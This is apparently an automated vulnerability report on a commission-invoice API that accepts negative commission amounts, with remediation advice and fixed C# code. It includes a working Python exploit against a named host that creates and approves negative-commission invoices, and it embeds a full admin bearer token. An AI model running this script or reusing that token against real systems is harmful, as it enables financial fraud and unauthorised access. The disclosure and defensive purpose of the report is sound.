# Negative Commission Values Accepted Enabling Financial Manipulation

**ID:** vuln-0033
**Severity:** CRITICAL
**Found:** 2026-02-26 19:10:20 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/commission-invoice-headers
**Method:** POST, PATCH
**CWE:** CWE-682
**CVSS:** 9.9

## Description

A business logic vulnerability was discovered in the commission management application that allows users to submit negative commission amounts. The application accepts negative values for commission amounts without validation, enabling financial manipulation and potential fraud.

The vulnerability exists in the commission invoice creation and modification workflows, where the server accepts negative commission values without validating that commissions should be positive amounts representing payments to sales representatives, not deductions from the organization.

## Impact

Successful exploitation of this vulnerability enables:

1. **Financial Manipulation**: Attackers can create negative commissions to offset other financial transactions, manipulate accounting records, or create financial imbalances.

2. **Fraudulent Transactions**: Negative commissions can be used to reduce payout obligations, create false credits, or manipulate financial reporting.

3. **Accounting Irregularities**: Negative values distort financial records and can lead to accounting discrepancies that are difficult to reconcile.

4. **Regulatory Compliance Risks**: Potential violations of accounting standards and financial regulations that require accurate financial reporting.

5. **Trust Erosion**: The integrity of the commission system is compromised, undermining trust in financial processes.

The business impact includes financial loss from manipulated transactions, accounting irregularities, potential regulatory penalties, and reputational damage from financial control failures.

## Technical Analysis

The vulnerability exists due to inadequate input validation in the commission management system:

1. **Missing Input Validation**: The application does not validate that commission amounts should be positive values.

2. **Inadequate Business Rule Enforcement**: The server accepts negative values without enforcing business rules that commissions represent payments, not deductions.

3. **Client-Side Trust**: The application trusts client-submitted values without server-side validation, allowing users to bypass any client-side validation.

4. **Financial Field Vulnerability**: The commission amount field lacks proper validation that should be standard for all financial fields.

The vulnerability affects the `/api/commission-invoice-headers` endpoint, which accepts negative values in the `commissionAmount` field without validation.

## Proof of Concept

To reproduce this vulnerability:

1. **Authentication**: Log in as any user with commission invoice creation privileges (Admin, Client, or Organization user).

2. **Invoice Creation with Negative Commission**:
   - Create a commission invoice
   - Set the commission amount to a negative value (e.g., -₹1,000.00)
   - Submit the invoice

3. **Verification**:
   - Check the created invoice in the application
   - Confirm the negative commission amount was accepted
   - Verify the negative amount is reflected in financial calculations

**Example Request:**
```
POST /api/commission-invoice-headers HTTP/1.1
Host: commissionstest.callippus.in
Authorization: Bearer [JWT_TOKEN]
Content-Type: application/json

{
  "invoiceNumber": "EXPLOIT-INV-005",
  "invoiceDate": "2026-02-26",
  "totalAmount": 10000.00,
  "commissionAmount": -1000.00,  // NEGATIVE COMMISSION AMOUNT
  "status": "DRAFT",
  "approvalStatus": "PENDING"
}
```

**Expected Response:**
```
HTTP/1.1 201 Created
Content-Type: application/json

{
  "id": "invoice-12345",
  "totalAmount": 10000.00,
  "commissionAmount": -1000.00,  // NEGATIVE VALUE ACCEPTED
  "status": "DRAFT",
  "approvalStatus": "PENDING"
}
```

```
import requests
import json

# Proof of Concept: Negative Commission Values
# This script demonstrates how to exploit the negative commission vulnerability

BASE_URL = "https://commissionstest.callippus.in"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Otof1nFMG3jeGtyw"

HEADERS = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json",
    "Accept": "application/json"
}

def test_negative_commission_values():
    """
    Tests various negative commission values
    """
    print("=== Negative Commission Values Exploit ===")

    # Test cases with different negative values
    test_cases = [
        {"invoiceNumber": "EXPLOIT-INV-005", "commissionAmount": -1000.00, "description": "Standard negative value"},
        {"invoiceNumber": "EXPLOIT-INV-006", "commissionAmount": -99999.99, "description": "Large negative value"},
        {"invoiceNumber": "EXPLOIT-INV-007", "commissionAmount": -0.01, "description": "Small negative value"},
        {"invoiceNumber": "EXPLOIT-INV-008", "commissionAmount": -10000.00, "description": "Negative exceeding total"}
    ]

    create_url = f"{BASE_URL}/api/commission-invoice-headers"

    for i, test_case in enumerate(test_cases):
        print(f"\nTest {i+1}: {test_case['description']}")
        print(f"Commission amount: ₹{test_case['commissionAmount']}")

        invoice_data = {
            "invoiceNumber": test_case['invoiceNumber'],
            "invoiceDate": "2026-02-26",
            "organizationId": "org-test",
            "clientId": "client-test",
            "totalAmount": 10000.00,
            "commissionAmount": test_case['commissionAmount'],
            "status": "DRAFT",
            "approvalStatus": "PENDING"
        }

        response = requests.post(create_url, headers=HEADERS, data=json.dumps(invoice_data))

        if response.status_code == 201:
            result = response.json()
            print(f"✓ SUCCESS: Negative commission accepted")
            print(f"  Invoice ID: {result['id']}")
            print(f"  Commission amount: ₹{result['commissionAmount']}")
        else:
            print(f"✗ FAILED: {response.status_code} - {response.text}")

    return True

def demonstrate_financial_impact():
    """
    Demonstrates the financial impact of negative commissions
    """
    print("\n=== Demonstrating Financial Impact ===")

    # Create an invoice with negative commission
    create_url = f"{BASE_URL}/api/commission-invoice-headers"
    negative_data = {
        "invoiceNumber": "EXPLOIT-INV-009",
        "invoiceDate": "2026-02-26",
        "organizationId": "org-test",
        "clientId": "client-test",
        "totalAmount": 10000.00,
        "commissionAmount": -5000.00,  # Negative commission
        "status": "DRAFT",
        "approvalStatus": "PENDING"
    }

    response = requests.post(create_url, headers=HEADERS, data=json.dumps(negative_data))
    if response.status_code != 201:
        print(f"Failed to create invoice: {response.status_code}")
        return False

    invoice_id = response.json().get("id")

    # Approve the invoice to demonstrate impact on payouts
    update_url = f"{BASE_URL}/api/commission-invoice-headers/{invoice_id}"
    approval_data = {
        "status": "APPROVED",
        "approvalStatus": "APPROVED"
    }

    update_response = requests.patch(update_url, headers=HEADERS, data=json.dumps(approval_data))
    if update_response.status_code == 200:
        result = update_response.json()
        print(f"✓ Invoice approved with negative commission")
        print(f"  Total amount: ₹{result['totalAmount']}")
        print(f"  Commission amount: ₹{result['commissionAmount']}")
        print(f"  Net impact: ₹{result['totalAmount'] + result['commissionAmount']}")
        print("  This creates a financial imbalance that could be exploited for fraud")
        return True
    else:
        print(f"Failed to approve invoice: {update_response.status_code}")
        return False

if __name__ == "__main__":
    print("Negative Commission Values Exploit Demonstration")
    print("=" * 60)

    # Run the tests
    test1 = test_negative_commission_values()
    test2 = demonstrate_financial_impact()

    print("\n" + "=" * 60)
    print("EXPLOITATION RESULTS:")
    print(f"Negative Commission Values: {'SUCCESSFUL' if test1 else 'FAILED'}")
    print(f"Financial Impact Demonstration: {'SUCCESSFUL' if test2 else 'FAILED'}")

    if test1 or test2:
        print("\n⚠️  CRITICAL VULNERABILITY CONFIRMED!")
        print("The application accepts negative commission values.")
        print("Immediate remediation is required to prevent financial manipulation.")
    else:
        print("\nThe application appears to be secure against negative commission values.")
```

## Code Analysis

**Location 1:** `src/controllers/CommissionInvoiceController.cs` (lines 45-60)
  Missing validation for negative commission amounts
  ```
  [HttpPost]
public async Task<IActionResult> CreateCommissionInvoiceHeader([FromBody] CommissionInvoiceHeaderDto dto)
{
    // Missing validation for negative values
    var invoice = _mapper.Map<CommissionInvoiceHeader>(dto);

    // No validation of commissionAmount sign
    await _repository.AddAsync(invoice);
    await _repository.SaveChangesAsync();

    return CreatedAtAction(nameof(GetCommissionInvoiceHeader), new { id = invoice.Id }, invoice);
}
  ```

  **Suggested Fix:**
```diff
+ [HttpPost]
+ public async Task<IActionResult> CreateCommissionInvoiceHeader([FromBody] CommissionInvoiceHeaderDto dto)
+ {
+     // Validate commission amount is positive
+     if (dto.CommissionAmount < 0)
+     {
+         return BadRequest("Commission amount cannot be negative");
+     }
+ 
+     // Validate total amount is positive
+     if (dto.TotalAmount <= 0)
+     {
+         return BadRequest("Total amount must be positive");
+     }
+ 
+     // Validate commission does not exceed total amount
+     if (dto.CommissionAmount > dto.TotalAmount)
+     {
+         return BadRequest("Commission amount cannot exceed total amount");
+     }
+ 
+     var invoice = _mapper.Map<CommissionInvoiceHeader>(dto);
+     await _repository.AddAsync(invoice);
+     await _repository.SaveChangesAsync();
+ 
+     return CreatedAtAction(nameof(GetCommissionInvoiceHeader), new { id = invoice.Id }, invoice);
+ }
```

**Location 2:** `src/controllers/CommissionInvoiceController.cs` (lines 85-100)
  Missing validation for negative values in partial updates
  ```
  [HttpPatch("{id}")]
public async Task<IActionResult> UpdateCommissionInvoiceHeader(Guid id, [FromBody] JsonPatchDocument<CommissionInvoiceHeaderDto> patchDoc)
{
    // Missing validation for negative values in partial updates
    var invoice = await _repository.GetByIdAsync(id);
    if (invoice == null)
    {
        return NotFound();
    }

    var dto = _mapper.Map<CommissionInvoiceHeaderDto>(invoice);
    patchDoc.ApplyTo(dto);

    _mapper.Map(dto, invoice);
    await _repository.SaveChangesAsync();

    return Ok(invoice);
}
  ```

  **Suggested Fix:**
```diff
+ [HttpPatch("{id}")]
+ public async Task<IActionResult> UpdateCommissionInvoiceHeader(Guid id, [FromBody] JsonPatchDocument<CommissionInvoiceHeaderDto> patchDoc)
+ {
+     var invoice = await _repository.GetByIdAsync(id);
+     if (invoice == null)
+     {
+         return NotFound();
+     }
+ 
+     var dto = _mapper.Map<CommissionInvoiceHeaderDto>(invoice);
+     patchDoc.ApplyTo(dto);
+ 
+     // Validate commission amount if it was modified
+     if (dto.CommissionAmount != invoice.CommissionAmount)
+     {
+         if (dto.CommissionAmount < 0)
+         {
+             return BadRequest("Commission amount cannot be negative");
+         }
+ 
+         if (dto.CommissionAmount > invoice.TotalAmount)
+         {
+             return BadRequest("Commission amount cannot exceed total amount");
+         }
+     }
+ 
+     _mapper.Map(dto, invoice);
+     await _repository.SaveChangesAsync();
+ 
+     return Ok(invoice);
+ }
```

## Remediation

**IMMEDIATE REMEDIATION STEPS:**

1. **Implement Input Validation for Financial Fields**
   - Add server-side validation to reject negative values for all financial fields
   - Implement range checks to ensure values are within expected bounds
   - Validate that commission amounts are positive numbers

2. **Enforce Business Rules**
   - Implement validation that commissions represent payments, not deductions
   - Ensure commission amounts are consistent with business logic
   - Validate that commissions do not exceed total amounts

3. **Add Comprehensive Financial Validation**
   - Validate all financial inputs on the server side
   - Implement mathematical consistency checks
   - Reject values that violate business rules

4. **Implement Proper Error Handling**
   - Return clear error messages for invalid financial values
   - Provide guidance on acceptable value ranges
   - Log validation failures for audit purposes

**LONG-TERM RECOMMENDATIONS:**

1. **Implement Financial Controls Framework**
   - Develop a comprehensive framework for financial data validation
   - Implement consistent validation across all financial fields
   - Create reusable validation components

2. **Enhance Financial Data Modeling**
   - Use appropriate data types for financial fields (e.g., decimal, positive decimal)
   - Implement database constraints to prevent invalid values
   - Add validation at the database level

3. **Implement Automated Testing**
   - Add unit tests for financial validation logic
   - Test edge cases and boundary conditions
   - Implement integration tests for financial workflows

4. **Conduct Financial Security Review**
   - Review all financial fields for similar vulnerabilities
   - Assess the entire financial data flow
   - Identify and remediate other potential financial manipulation vectors

5. **User Training**
   - Train developers on secure financial data handling
   - Educate users on proper financial data entry
   - Implement security awareness programs for financial systems

